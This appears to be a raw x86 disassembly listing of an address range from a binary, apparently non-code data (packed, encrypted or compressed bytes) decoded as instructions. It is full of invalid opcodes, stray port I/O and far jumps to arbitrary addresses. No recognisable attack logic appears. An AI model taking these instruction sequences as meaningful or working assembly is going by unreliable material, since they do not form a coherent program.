  40fd40:	mov    al,0x1c
  40fd42:	retf   
  40fd43:	fidiv  DWORD PTR [edx]
  40fd45:	icebp  
  40fd46:	fchs   
  40fd48:	sub    ebp,DWORD PTR [esi+0x1e51aa89]
  40fd4e:	mov    ds:0x5838b733,al
  40fd53:	mov    bl,0x20
  40fd55:	adc    ecx,ebp
  40fd57:	dec    esi
  40fd58:	pusha  
  40fd59:	rol    cl,cl
  40fd5b:	mov    eax,0x22ec7072
  40fd60:	adc    al,0x64
  40fd62:	xchg   ah,dl
  40fd64:	adc    DWORD PTR [ecx],edx
  40fd66:	int    0x69
  40fd68:	sub    DWORD PTR [esi+0x5e],esp
  40fd6b:	jle    0x40fd3c
  40fd6d:	call   0xb023:0x2243df8a
  40fd74:	or     al,0xf
  40fd76:	pop    ebp
  40fd77:	rcr    DWORD PTR [edi+0x71f1dc11],1
  40fd7d:	sbb    bl,BYTE PTR [ebx]
  40fd7f:	push   ecx
  40fd80:	cld    
  40fd81:	push   0xf2e1e184
  40fd86:	cmp    edi,DWORD PTR [edx]
  40fd88:	jae    0x40fd4b
  40fd8a:	mov    dh,0x8e
  40fd8c:	lods   al,BYTE PTR ds:[esi]
  40fd8d:	push   ebp
  40fd8e:	aad    0x55
  40fd90:	in     al,dx
  40fd91:	xchg   esp,eax
  40fd92:	fcmovnb st,st(5)
  40fd94:	ror    dl,cl
  40fd96:	int3   
  40fd97:	leave  
  40fd98:	(bad)  
  40fd99:	dec    ebx
  40fd9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd9b:	mov    ebx,0x11811038
  40fda0:	xor    esi,DWORD PTR [edx-0x21beb2d5]
  40fda6:	cmp    eax,0x6b13d574
  40fdab:	and    ecx,eax
  40fdad:	lods   eax,DWORD PTR ds:[esi]
  40fdae:	mov    ds:0xd956d2f8,al
  40fdb3:	xchg   edi,eax
  40fdb5:	and    ebp,DWORD PTR [eax]
  40fdb7:	mov    gs,esp
  40fdb9:	in     eax,0x15
  40fdbb:	cmc    
  40fdbc:	inc    ebp
  40fdbd:	xchg   ecx,eax
  40fdbe:	dec    ebx
  40fdbf:	fwait
  40fdc0:	shl    cl,cl
  40fdc2:	cli    
  40fdc3:	or     DWORD PTR [edi*8+0x10d6c2af],ebp
  40fdca:	and    BYTE PTR [edi-0x34],cl
  40fdcd:	pop    edi
  40fdce:	jnp    0x40fe48
  40fdd0:	push   edx
  40fdd1:	aaa    
  40fdd2:	popa   
  40fdd3:	(bad)  
  40fdd4:	mov    WORD PTR [edx+eax*4+0x3fdf4b0c],ss
  40fddb:	mov    ebp,0xf9d11cf
  40fde0:	lods   eax,DWORD PTR ds:[esi]
  40fde1:	jecxz  0x40fe3f
  40fde3:	inc    edi
  40fde4:	repz dec ebp
  40fde6:	iret   
  40fde7:	outs   dx,DWORD PTR ds:[esi]
  40fde8:	ror    DWORD PTR [ebp+edi*1-0x57],1
  40fdec:	fist   DWORD PTR [ecx+0x63236100]
  40fdf2:	lea    ecx,cs:[ecx-0x59]
  40fdf6:	(bad)  [ebx]
  40fdf8:	pop    ecx
  40fdf9:	call   0x7485:0xcebe454b
  40fe00:	mov    dh,0xb3
  40fe02:	lods   eax,DWORD PTR ds:[esi]
  40fe03:	sbb    BYTE PTR [ecx-0x3],ah
  40fe06:	mov    esp,0xd756d08e
  40fe0b:	jo     0x40fde3
  40fe0d:	(bad)  [esi-0x5c40524e]
  40fe13:	lods   eax,DWORD PTR ds:[esi]
  40fe14:	pop    esi
  40fe15:	nop
  40fe16:	das    
  40fe17:	adc    DWORD PTR [edx+0x76],edx
  40fe1a:	js     0x40fe06
  40fe1c:	mov    edx,DWORD PTR [ecx]
  40fe1e:	add    dh,al
  40fe20:	and    eax,0xf4c345e4
  40fe25:	pop    ds
  40fe26:	test   DWORD PTR [eax-0x4b],ebp
  40fe29:	xchg   ecx,eax
  40fe2a:	inc    edx
  40fe2b:	in     eax,dx
  40fe2c:	ret    
  40fe2d:	mov    ch,BYTE PTR [ebp-0x74]
  40fe30:	jg     0x40fdd6
  40fe32:	mov    bh,cl
  40fe34:	sub    DWORD PTR [esi+0x650c3105],ebp
  40fe3a:	test   al,0xff
  40fe3c:	rcl    BYTE PTR [edi],cl
  40fe3e:	sar    DWORD PTR cs:[esi+ebp*2],cl
  40fe42:	je     0x40fe07
  40fe44:	lock in eax,dx
  40fe46:	xchg   DWORD PTR [esi-0x32],esp
  40fe49:	add    BYTE PTR [ebx],bh
  40fe4b:	out    dx,al
  40fe4c:	sbb    BYTE PTR [ecx],dl
  40fe4e:	fxch   st(2)
  40fe50:	and    BYTE PTR [edi+0x69d02ae7],ch
  40fe56:	jle    0x40fe90
  40fe58:	test   DWORD PTR [ecx-0x13f40575],edx
  40fe5e:	cmp    cl,BYTE PTR [ebp-0x7db86c82]
  40fe64:	clc    
  40fe65:	xor    eax,0x7fd2c4b2
  40fe6a:	push   ss
  40fe6b:	lods   al,BYTE PTR ds:[esi]
  40fe6c:	inc    ecx
  40fe6d:	xchg   esi,eax
  40fe6e:	mov    cl,0xdc
  40fe70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe71:	adc    DWORD PTR [edi+0x6e],edi
  40fe74:	loop   0x40fe3a
  40fe76:	int3   
  40fe77:	sub    esp,DWORD PTR [eax]
  40fe79:	mov    edx,0x75c626d6
  40fe7e:	jp     0x40fef1
  40fe80:	adc    bl,BYTE PTR [esi]
  40fe82:	popa   
  40fe83:	cmp    al,0xaa
  40fe85:	lahf   
  40fe86:	stos   DWORD PTR es:[edi],eax
  40fe87:	push   0xffffffba
  40fe89:	adc    DWORD PTR [esi],ebx
  40fe8b:	or     DWORD PTR [edi],edi
  40fe8d:	sti    
  40fe8e:	sbb    esi,DWORD PTR [edx+0x58846c0b]
  40fe94:	jns    0x40fe90
  40fe96:	es push edx
  40fe98:	push   esi
  40fe99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe9a:	lea    esi,cs:[edi+0x74b1802e]
  40fea1:	mov    ebx,DWORD PTR [ebp+0xb80d262]
  40fea7:	sub    eax,ebx
  40fea9:	outs   dx,DWORD PTR ds:[esi]
  40feaa:	adc    eax,0x7c17365c
  40feaf:	xor    BYTE PTR [ebx],bh
  40feb1:	mov    ecx,0x15920e4c
  40feb6:	(bad)  
  40feb7:	fstp   DWORD PTR [ecx]
  40feb9:	dec    eax
  40feba:	mov    WORD PTR [edi-0x43],ds
  40febd:	adc    eax,esp
  40febf:	pop    ebx
  40fec0:	mov    esp,0x17dbf786
  40fec5:	adc    DWORD PTR [edx-0x1256bcc1],esp
  40fecb:	jle    0x40ff11
  40fecd:	push   ss
  40fece:	test   DWORD PTR [ebx+0x54e2ca64],ecx
  40fed4:	fistp  DWORD PTR [eax-0x25e98378]
  40feda:	outs   dx,DWORD PTR ds:[esi]
  40fedb:	mov    ds,WORD PTR [esi+0x79]
  40fede:	mov    ah,BYTE PTR [ebp-0x7]
  40fee1:	inc    edi
  40fee2:	test   bh,ah
  40fee4:	pop    ecx
  40fee5:	and    cl,bl
  40fee7:	push   esp
  40fee8:	adc    ecx,DWORD PTR [eax-0x6c]
  40feeb:	mov    cs,WORD PTR ds:0xa65f4615
  40fef1:	test   DWORD PTR [ecx],esi
  40fef3:	pusha  
  40fef4:	shl    BYTE PTR [ebx],cl
  40fef6:	xchg   BYTE PTR [edx+0x4e],dl
  40fef9:	and    eax,0x11f572bb
  40fefe:	test   BYTE PTR [edx],0x14
  40ff01:	sub    ch,dl
  40ff03:	pop    ds
  40ff04:	fst    DWORD PTR [edx-0x7c]
  40ff07:	xor    eax,0xf14d8a83
  40ff0c:	in     eax,dx
  40ff0d:	adc    eax,0x69508e14
  40ff12:	jmp    0xdaa50f02
  40ff17:	stos   BYTE PTR es:[edi],al
  40ff18:	jb     0x40ff98
  40ff1a:	data16 cld 
  40ff1c:	lods   eax,DWORD PTR ds:[esi]
  40ff1d:	test   BYTE PTR [edx+0x78cc9f56],bl
  40ff23:	ss mov bh,0x65
  40ff26:	loop   0x40feb6
  40ff28:	sbb    BYTE PTR [esi],0x17
  40ff2b:	out    dx,eax
  40ff2c:	nop
  40ff2d:	sub    DWORD PTR [ebx+0x3ee9e57e],0x4963398d
  40ff37:	jne    0x40ff7f
  40ff39:	adc    ebp,ebp
  40ff3b:	jmp    0x40fef3
  40ff3d:	pop    es
  40ff3e:	xchg   esi,eax
  40ff3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff40:	xor    ah,BYTE PTR [edx]
  40ff42:	test   DWORD PTR [eax],edx
  40ff44:	dec    edx
  40ff45:	into   
  40ff46:	and    ecx,DWORD PTR [edi+ebp*2]
  40ff49:	xchg   ebx,eax
  40ff4a:	test   ebp,edi
  40ff4c:	and    BYTE PTR [edi],bh
  40ff4e:	or     BYTE PTR [edi+eiz*1-0x4d],bl
  40ff52:	mov    bl,0x8e
  40ff54:	push   ss
  40ff55:	addr16 xchg ecx,eax
  40ff57:	inc    edx
  40ff58:	scas   eax,DWORD PTR es:[edi]
  40ff59:	(bad)  
  40ff5a:	sbb    cl,dl
  40ff5c:	sar    BYTE PTR [eax+0x64],cl
  40ff5f:	push   ebx
  40ff60:	lock adc al,0xcf
  40ff63:	dec    ebx
  40ff64:	aas    
  40ff65:	adc    eax,edx
  40ff67:	jmp    0x103be7c3
  40ff6c:	icebp  
  40ff6d:	pop    ebx
  40ff6e:	into   
  40ff6f:	fnstsw WORD PTR [esi]
  40ff71:	cmp    DWORD PTR [ebp-0x53e12789],eax
  40ff77:	ds cli 
  40ff79:	dec    esi
  40ff7a:	stos   DWORD PTR es:[edi],eax
  40ff7b:	xchg   esp,eax
  40ff7c:	dec    ebp
  40ff7d:	sub    al,0x43
  40ff7f:	rol    BYTE PTR [edi+0x1e],0x32
  40ff83:	out    0x4b,eax
  40ff85:	shl    BYTE PTR [esi-0x23],1
  40ff88:	ror    BYTE PTR [ecx+edi*8],cl
  40ff8b:	fwait
  40ff8c:	shl    BYTE PTR [esi-0x69],1
  40ff8f:	sbb    eax,0xc92d1e4a
  40ff94:	dec    edi
  40ff95:	aaa    
  40ff96:	neg    dh
  40ff98:	mov    dl,0x7c
  40ff9a:	out    dx,eax
  40ff9b:	rcr    DWORD PTR [esi],1
  40ff9d:	jo     0x40ffd6
  40ff9f:	loope  0x40ff73
  40ffa1:	push   es
  40ffa2:	out    0x45,al
  40ffa4:	stos   BYTE PTR es:[edi],al
  40ffa5:	loope  0x40ffea
  40ffa7:	push   0xffffffb6
  40ffa9:	adc    DWORD PTR [esi-0xe7eae15],ecx
  40ffaf:	jmp    0x226e:0x3685f5cb
  40ffb6:	(bad)  
  40ffb8:	sub    eax,0x268996bb
  40ffbd:	pop    eax
  40ffbe:	js     0x410018
  40ffc0:	lods   al,BYTE PTR ds:[esi]
  40ffc1:	sbb    BYTE PTR ds:0xfa2eb6c4,ah
  40ffc7:	pop    esp
  40ffc8:	sar    BYTE PTR [ebx],cl
  40ffca:	das    
  40ffcb:	push   esi
  40ffcc:	mov    bl,0xa1
  40ffce:	pop    eax
  40ffcf:	or     ch,BYTE PTR [edx]
  40ffd1:	pop    ss
  40ffd2:	pop    edi
  40ffd3:	mov    eax,ds:0xab05f1b2
  40ffd8:	and    ebp,DWORD PTR [eax+0x2ed2323c]
  40ffde:	adc    BYTE PTR [ebx],al
  40ffe0:	hlt    
  40ffe1:	nop
  40ffe2:	mov    ebp,0x6c14c86a
  40ffe7:	fst    DWORD PTR [edi-0x2d]
  40ffea:	test   DWORD PTR [edx],esp
  40ffec:	push   es
  40ffed:	sbb    al,0x7a
  40ffef:	into   
  40fff0:	shl    BYTE PTR [esp+esi*4-0x6b],0x52
  40fff5:	push   edx
  40fff6:	cmp    DWORD PTR [esi],0xffffffc3
  40fff9:	jne    0x40ff92
  40fffb:	mov    cs,WORD PTR [eax-0x7b]
  40fffe:	sbb    DWORD PTR [ebx-0x32],0xd88d00b5
  410005:	mov    WORD PTR [ebx-0x34032d9c],?
  41000b:	jo     0x410003
  41000d:	mov    DWORD PTR [esi],edx
  41000f:	mov    esp,?
  410011:	dec    edx
  410012:	mov    edi,DWORD PTR [esp+edx*4]
  410015:	ins    DWORD PTR es:[edi],dx
  410016:	inc    esp
  410017:	xchg   edi,eax
  410018:	cs (bad) 
  41001a:	out    dx,eax
  41001b:	lods   al,BYTE PTR ds:[esi]
  41001c:	les    eax,FWORD PTR [esi]
  41001e:	js     0x40ffde
  410020:	rol    dl,cl
  410022:	iret   
  410023:	pop    ebp
  410024:	push   0xffffffb5
  410026:	test   al,0x8e
  410028:	imul   BYTE PTR [ecx+0x28]
  41002b:	imul   edi,ecx,0x60
  41002e:	sub    al,0xd
  410030:	sar    BYTE PTR ds:0xa0b92c26,cl
  410036:	push   ebx
  410037:	retf   0x11ca
  41003a:	cld    
  41003b:	not    BYTE PTR [edi-0x7bd5fdc2]
  410041:	xchg   edi,ebp
  410043:	lods   al,BYTE PTR ds:[esi]
  410044:	fisubr DWORD PTR [edx-0x7c]
  410047:	es pop ds
  410049:	hlt    
  41004a:	(bad)  [esi+edi*1]
  41004d:	and    eax,0xb0c7bb7c
  410052:	push   0x8488ee17
  410057:	mov    esi,0xb1a94fa7
  41005c:	sar    BYTE PTR [esi],cl
  41005e:	in     al,dx
  41005f:	push   esi
  410060:	call   0x459a5927
  410065:	push   ds
  410066:	inc    edi
  410067:	cld    
  410068:	mov    ecx,esp
  41006a:	retf   
  41006b:	js     0x41008d
  41006d:	mov    esp,0x5bd23bda
  410072:	mov    BYTE PTR [ebx+0x3d],bh
  410075:	stos   DWORD PTR es:[edi],eax
  410076:	pop    ebx
  410077:	(bad)  
  410078:	jns    0x410098
  41007a:	aam    0x7e
  41007c:	nop
  41007d:	or     BYTE PTR [eax-0x7b211b26],0x3d
  410084:	mov    eax,ds:0x6911e6db
  410089:	inc    ecx
  41008a:	(bad)  
  41008b:	ror    BYTE PTR ds:0x3526d717,1
  410091:	aam    0x15
  410093:	pop    esi
  410094:	dec    ebx
  410095:	xor    bl,BYTE PTR [esi+0x27]
  410098:	ds adc eax,ebp
  41009b:	xchg   esp,eax
  41009c:	cmp    DWORD PTR [eax],ebx
  41009e:	(bad)
  4100a1:	lea    eax,[ebp-0x4262f610]
  4100a7:	and    al,0x61
  4100a9:	pop    eax
  4100aa:	out    dx,eax
  4100ab:	xchg   ebx,eax
  4100ac:	and    al,BYTE PTR [ecx]
  4100ae:	out    dx,al
  4100af:	jnp    0x41012a
  4100b1:	pop    ds
  4100b2:	test   DWORD PTR [edi+eiz*2],edi
  4100b5:	retf   
  4100b6:	les    ebx,FWORD PTR [esi]
  4100b8:	mov    eax,0x858eacb3
  4100bd:	ds push 0xfc06ab4e
  4100c3:	cld    
  4100c4:	cmp    DWORD PTR [edi+ebp*8+0x5ff275b],esp
  4100cb:	shr    BYTE PTR [eax-0x74],cl
  4100ce:	ins    DWORD PTR es:[edi],dx
  4100cf:	in     eax,dx
  4100d0:	sub    BYTE PTR [eax-0x51],dh
  4100d3:	lea    esi,[edx-0x66aaa479]
  4100d9:	neg    DWORD PTR [eax-0x3e]
  4100dc:	adc    eax,0x27a117
  4100e1:	loopne 0x41006e
  4100e3:	add    ch,BYTE PTR [ebx+0x7f]
  4100e6:	leave  
  4100e7:	out    dx,al
  4100e8:	jo     0x4100b9
  4100ea:	fs mov ?,esp
  4100ed:	fimul  DWORD PTR [eax+0x56]
  4100f0:	xchg   edi,eax
  4100f1:	and    ebp,DWORD PTR [esi]
  4100f3:	inc    ebp
  4100f4:	(bad)  
  4100f5:	ins    DWORD PTR es:[edi],dx
  4100f6:	pop    ebp
  4100f7:	(bad)  
  4100f8:	shr    BYTE PTR [eax+ecx*8],cl
  4100fb:	stc    
  4100fc:	sbb    edi,esi
  4100fe:	mov    ecx,0xd72ed388
  410103:	dec    esi
  410104:	retf   
  410105:	fcomp  DWORD PTR [ecx-0x3f]
  410108:	mov    ecx,0xe2ff8bc9
  41010d:	fadd   QWORD PTR [edi+0x66f1bf17]
  410113:	inc    esi
  410114:	sbb    edx,DWORD PTR [ecx]
  410116:	outs   dx,BYTE PTR ds:[esi]
  410117:	icebp  
  410118:	rol    BYTE PTR [edi+0x6d89a7e4],1
  41011e:	test   BYTE PTR [ecx-0x17f24967],bh
  410124:	push   0x6c8e5ac2
  410129:	cmc    
  41012a:	aad    0xb0
  41012c:	leave  
  41012d:	(bad)  
  41012e:	imul   eax,DWORD PTR [esi-0x4069a12e],0xd4f65509
  410138:	jbe    0x41014e
  41013a:	mov    eax,edi
  41013c:	sub    ecx,DWORD PTR [ecx]
  41013e:	daa    
  41013f:	pop    ebp
  410140:	adc    al,0xe1
  410142:	icebp  
  410143:	sbb    DWORD PTR [ecx-0x68997ad2],ebp
  410149:	inc    esi
  41014a:	cli    
  41014b:	sub    esi,DWORD PTR [ebx-0x3e]
  41014e:	dec    ebp
  41014f:	mov    cs,WORD PTR [esi]
  410151:	cdq    
  410152:	jge    0x4100f6
  410154:	(bad)  
  410155:	mov    ds:0x44c7d333,al
  41015a:	xor    esp,eax
  41015c:	rcl    DWORD PTR [esi],cl
  41015e:	gs es call 0x955a9af
  410165:	adc    eax,edx
  410167:	and    al,0x3d
  410169:	sbb    dl,BYTE PTR [edi]
  41016b:	jno    0x4101bd
  41016d:	push   eax
  41016e:	test   BYTE PTR [ebx],ah
  410170:	or     al,0x2e
  410172:	icebp  
  410173:	stos   BYTE PTR es:[edi],al
  410174:	sub    eax,0x8e8ad118
  410179:	ds ins BYTE PTR es:[edi],dx
  41017b:	into   
  41017c:	cs iret 
  41017e:	jno    0x41012b
  410180:	not    BYTE PTR [eax-0x7b]
  410183:	or     dh,dl
  410185:	inc    esi
  410186:	inc    esp
  410187:	adc    dl,bh
  410189:	jo     0x4101e9
  41018b:	jae    0x410136
  41018d:	imul   ecx,edi,0x671d67ef
  410193:	ins    BYTE PTR es:[edi],dx
  410194:	mov    WORD PTR [ecx+0x2342ad35],?
  41019a:	dec    ebp
  41019b:	(bad)
  41019e:	test   al,0x13
  4101a0:	arpl   WORD PTR [ebp+0x111216dd],bp
  4101a6:	mov    edx,0xd06180d5
  4101ab:	xor    eax,0x6b850f58
  4101b0:	push   es
  4101b1:	retf   
  4101b2:	xchg   esi,eax
  4101b3:	adc    esp,edi
  4101b5:	sbb    ch,cl
  4101b7:	mov    edx,0x9b0fd3d1
  4101bc:	imul   esi,DWORD PTR [eax],0x5
  4101bf:	fs sbb eax,0x3eb3a1a7
  4101c5:	push   edx
  4101c6:	or     al,0xf1
  4101c8:	rcr    BYTE PTR [edx+0x64],cl
  4101cb:	(bad)  
  4101cc:	stos   DWORD PTR es:[edi],eax
  4101cd:	leave  
  4101ce:	retf   0x3d1f
  4101d1:	aas    
  4101d2:	sub    al,0x7e
  4101d4:	sub    al,0x1e
  4101d6:	test   eax,0xef64e24e
  4101db:	lahf   
  4101dc:	loopne 0x41019c
  4101de:	mov    bh,0x8e
  4101e0:	outs   dx,DWORD PTR ds:[esi]
  4101e1:	pop    ebp
  4101e2:	cmp    al,0x31
  4101e4:	push   ebp
  4101e5:	inc    esp
  4101e6:	(bad)  
  4101e7:	mov    gs,edi
  4101e9:	sub    esp,DWORD PTR [edi-0x33daee01]
  4101ef:	and    dl,dl
  4101f1:	mov    ds:0xe71ce723,eax
  4101f6:	push   edx
  4101f7:	mov    ah,BYTE PTR [edi]
  4101f9:	adc    DWORD PTR [eax],eax
  4101fb:	in     al,dx
  4101fc:	fcmovne st,st(0)
  4101fe:	shl    bl,0xc1
  410201:	xor    al,0x85
  410203:	out    dx,al
  410204:	ss loope 0x410254
  410207:	mov    ch,0x91
  410209:	add    bh,bh
  41020b:	xchg   ecx,eax
  41020c:	add    al,0xe6
  41020e:	(bad)  
  410210:	fcomp  QWORD PTR [ebp+0x19e3130e]
  410216:	test   DWORD PTR [eax+0x3a],ebp
  410219:	cdq    
  41021a:	test   eax,0x1c74b5ba
  41021f:	xchg   ecx,eax
  410220:	cmp    dh,bl
  410222:	enter  0xfa47,0x2
  410226:	jns    0x410276
  410228:	xchg   edx,edx
  41022a:	jno    0x4101c0
  41022c:	int3   
  41022d:	outs   dx,DWORD PTR ds:[esi]
  41022e:	test   ebp,ebp
  410230:	mov    eax,ds:0xbc4a2b3d
  410235:	inc    ebp
  410236:	aad    0xb0
  410238:	sahf   
  410239:	jmp    0x1fbb:0x35a98e89
  410240:	jmp    0xd07d1aa3
  410245:	dec    esp
  410246:	call   0x74f2e829
  41024b:	scas   eax,DWORD PTR es:[edi]
  41024c:	adc    dl,BYTE PTR [eax+0x3]
  41024f:	imul   ebx,DWORD PTR [esi+0x1e],0x68
  410253:	push   ebx
  410254:	inc    esp
  410255:	stc    
  410256:	and    al,0x1c
  410258:	pop    ss
  410259:	mov    edi,0x9fd2f653
  41025e:	xor    ebx,DWORD PTR [edx+0x5b1153cd]
  410264:	(bad)  
  410266:	xchg   ecx,eax
  410267:	fsubr  QWORD PTR [esi+0x5]
  41026a:	das    
  41026b:	bound  esi,QWORD PTR [ebx+0x5e]
  41026e:	mov    cl,0xfb
  410270:	iret   
  410271:	stos   DWORD PTR es:[edi],eax
  410272:	push   ebx
  410273:	mov    dl,dl
  410275:	leave  
  410276:	in     eax,0x2a
  410278:	jmp    0x410256
  41027a:	in     eax,dx
  41027b:	push   ds
  41027c:	lods   al,BYTE PTR ds:[esi]
  41027d:	pop    es
  41027e:	daa    
  41027f:	adc    bl,BYTE PTR [ecx-0x61]
  410282:	ins    BYTE PTR es:[edi],dx
  410283:	(bad)  
  410284:	cmp    al,0xc2
  410286:	mov    esi,eax
  410288:	ja     0x4102b9
  41028a:	test   DWORD PTR [esp+ebx*4-0x7a],ebp
  41028e:	cmp    BYTE PTR [esi-0x24],al
  410291:	add    eax,0xbb448e78
  410296:	popa   
  410297:	mov    cl,0xa2
  410299:	add    dh,bh
  41029b:	sti    
  41029c:	ror    dh,cl
  41029e:	jnp    0x4102a9
  4102a0:	mov    DWORD PTR [esi+0x79e27b17],ecx
  4102a6:	xchg   edi,eax
  4102a7:	mov    fs,WORD PTR [esi-0x7]
  4102aa:	push   cs
  4102ab:	(bad)
  4102af:	in     al,dx
  4102b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102b1:	imul   esp,ecx,0x88f7c897
  4102b7:	jns    0x41028b
  4102b9:	cmp    BYTE PTR [ecx+0x1d],al
  4102bc:	jge    0x4102f1
  4102be:	and    al,0x8e
  4102c0:	or     ebx,esi
  4102c2:	sbb    eax,0xe741ab86
  4102c7:	xor    eax,0xde91f2d2
  4102cc:	xchg   BYTE PTR [eax],cl
  4102ce:	lock fwait
  4102d0:	not    BYTE PTR [ecx]
  4102d2:	pop    esi
  4102d3:	cmp    ebp,DWORD PTR [ecx-0x72658007]
  4102d9:	iret   
  4102da:	test   DWORD PTR [ebx-0x23],edi
  4102dd:	pop    bx
  4102df:	or     eax,0xe2005792
  4102e4:	adc    al,0x11
  4102e6:	sbb    al,0x4
  4102e8:	jg     0x4102c9
  4102ea:	pop    es
  4102eb:	repnz xchg ebp,eax
  4102ed:	xor    eax,DWORD PTR [ebp+0x24f994bf]
  4102f3:	pushf  
  4102f4:	or     DWORD PTR [ecx-0x9ee711d],eax
  4102fa:	jle    0x41034a
  4102fc:	ds inc ebp
  4102fe:	sets   dl
  410301:	adc    BYTE PTR [esi+0x25],bl
  410304:	imul   esp,DWORD PTR [ebx+eiz*8+0x52],0xd7c1e04
  41030c:	clc    
  41030d:	gs push ss
  41030f:	stos   DWORD PTR es:[edi],eax
  410310:	inc    edx
  410311:	pop    edx
  410312:	sti    
  410313:	pop    ecx
  410314:	rcr    dl,cl
  410316:	adc    bh,bl
  410318:	and    dl,ch
  41031a:	aad    0x4d
  41031c:	loop   0x41033c
  41031e:	popa   
  41031f:	(bad)  
  410320:	leave  
  410321:	cmp    eax,0x65d3700a
  410326:	jo     0x410371
  410328:	or     al,BYTE PTR [eax]
  41032a:	mov    cl,BYTE PTR [ebp+ebx*1-0x241af80a]
  410331:	jno    0x4102e0
  410333:	das    
  410334:	jmp    0xf32ae74a
  410339:	in     eax,0x62
  41033b:	pop    ds
  41033c:	sbb    al,0xce
  41033e:	test   DWORD PTR ds:0x6f63f14a,esi
  410344:	shl    edi,1
  410346:	fwait
  410347:	mov    cs,WORD PTR [ebx+ebp*8]
  41034a:	sbb    DWORD PTR [edx-0x498ab32b],edi
  410350:	shl    BYTE PTR [edx+0x9869818],cl
  410356:	mov    ah,0xab
  410358:	fst    QWORD PTR [ecx]
  41035a:	push   esp
  41035b:	push   eax
  41035c:	dec    ebp
  41035d:	hlt    
  41035e:	ret    
  41035f:	ja     0x41034c
  410361:	int    0x85
  410363:	jl     0x4102e5
  410365:	sub    al,0x18
  410367:	mov    ah,0x17
  410369:	into   
  41036a:	fmul   QWORD PTR [esi+0x24d27a11]
  410370:	inc    edx
  410371:	mov    ebx,0x55a9045d
  410376:	call   0x3977:0x847c664e
  41037d:	xchg   DWORD PTR [ebp-0x29c68172],edx
  410383:	mov    eax,0x3fec3104
  410388:	shl    al,cl
  41038a:	ss es cld 
  41038d:	mov    esp,0x119cd440
  410392:	bound  edi,QWORD PTR [eax]
  410394:	adc    DWORD PTR [edx+0x7],0x851cfeda
  41039b:	inc    eax
  41039c:	or     BYTE PTR [ecx],bl
  41039e:	mov    ds:0xb4541e68,al
  4103a3:	mov    ?,WORD PTR [edx-0x10]
  4103a6:	mov    edi,0xe815e743
  4103ab:	inc    edi
  4103ac:	in     al,0x3a
  4103ae:	push   esp
  4103af:	push   cs
  4103b0:	pop    ebp
  4103b1:	inc    esi
  4103b2:	and    edi,ebx
  4103b4:	or     BYTE PTR [ebp+0x113e61bd],dh
  4103ba:	enter  0x4879,0x4a
  4103be:	je     0x41042e
  4103c0:	fmul   DWORD PTR [esp+eax*4-0x7f]
  4103c4:	push   0xb64daf2b
  4103c9:	mov    al,ds:0x11816f44
  4103ce:	mov    ds:0x4d48e075,al
  4103d3:	jge    0x4103a4
  4103d5:	jecxz  0x4103c3
  4103d7:	aas    
  4103d8:	mov    ecx,0x10ac0514
  4103dd:	lods   eax,DWORD PTR ds:[esi]
  4103de:	scas   al,BYTE PTR es:[edi]
  4103df:	arpl   di,ax
  4103e1:	adc    DWORD PTR ds:0x28d138c8,ebx
  4103e7:	mov    ecx,0xbe606de5
  4103ec:	shr    al,cl
  4103ee:	cdq    
  4103ef:	pushf  
  4103f0:	xor    eax,0x8c4703f3
  4103f5:	adc    edi,ebx
  4103f7:	pop    edx
  4103f8:	adc    dh,ah
  4103fa:	or     al,0x1c
  4103fc:	lods   al,BYTE PTR ds:[esi]
  4103fd:	addr16 test bh,ch
  410400:	les    ebx,FWORD PTR [eax+esi*1+0xd]
  410404:	daa    
  410405:	xor    esp,DWORD PTR [eax]
  410407:	xchg   DWORD PTR [ebx-0x4e],ecx
  41040a:	or     DWORD PTR [esi-0x690e88d9],0xb4859c4d
  410414:	sbb    esi,DWORD PTR [ebx+0xf]
  410417:	inc    ebp
  410418:	mov    ebp,0xea8d0e50
  41041d:	mov    ds:0x52a5f5b4,al
  410422:	jp     0x41040a
  410424:	jl     0x4103b1
  410426:	test   ebp,ecx
  410428:	sbb    dl,BYTE PTR [ebx-0x5f]
  41042b:	xor    eax,0x8e71e63a
  410430:	xchg   ebp,eax
  410431:	inc    edx
  410432:	inc    esi
  410433:	lods   al,BYTE PTR ds:[esi]
  410434:	inc    edx
  410435:	test   al,0xb8
  410437:	rcl    dl,cl
  410439:	mov    ah,0xf9
  41043b:	imul   ebx,ebx,0xffffffc3
  41043e:	xlat   BYTE PTR ds:[ebx]
  41043f:	ds scas eax,DWORD PTR es:[edi]
  410441:	cmp    ecx,eax
  410443:	pop    ss
  410444:	sar    BYTE PTR [ecx+esi*2-0x7b],cl
  410448:	dec    eax
  410449:	iret   
  41044a:	outs   dx,DWORD PTR ds:[esi]
  41044b:	adc    eax,0xa41699d2
  410450:	push   es
  410451:	addr16 fwait
  410453:	pop    ecx
  410454:	add    al,0x11
  410456:	mov    ds:0x8ded3ff7,al
  41045b:	in     eax,dx
  41045c:	sbb    eax,DWORD PTR [di-0xa17]
  410461:	add    al,0x54
  410463:	jmp    0x2d0:0x5da79d54
  41046a:	push   0x46511921
  41046f:	out    0x45,al
  410471:	mov    cl,0x79
  410473:	icebp  
  410474:	test   eax,0xbc281283
  410479:	enter  0xf065,0xa8
  41047d:	(bad)  
  41047f:	mov    ss,ecx
  410481:	or     BYTE PTR [edi-0x6134af3c],0x9
  410488:	shl    BYTE PTR [eax],cl
  41048a:	inc    ebx
  41048b:	inc    ebp
  41048c:	mov    ds:0xac855a6a,eax
  410491:	in     eax,dx
  410492:	lea    ebx,[eax-0x3a246c9f]
  410498:	adc    al,BYTE PTR [ecx+0x5cc54e94]
  41049e:	mov    DWORD PTR ds:0xc4311fb,esi
  4104a4:	int    0xe6
  4104a6:	pop    eax
  4104a7:	neg    esp
  4104a9:	sub    BYTE PTR [ecx-0x7a500b0f],ch
  4104af:	pop    eax
  4104b0:	jecxz  0x410476
  4104b2:	retf   0xd285
  4104b5:	xchg   edx,eax
  4104b6:	lock aad 0x25
  4104b9:	imul   esp,ecx,0x1e040c70
  4104bf:	jne    0x4104f5
  4104c1:	xchg   ecx,eax
  4104c2:	or     edx,DWORD PTR [edx+edi*4-0x18]
  4104c6:	sbb    al,0x40
  4104c8:	rcr    BYTE PTR [ecx+0x24c33aff],cl
  4104ce:	and    eax,0x2b118b32
  4104d3:	retf   
  4104d4:	je     0x4104d0
  4104d6:	push   0x85c616c8
  4104db:	gs call 0x170c:0xf23c15f4
  4104e3:	mov    ?,WORD PTR [esi]
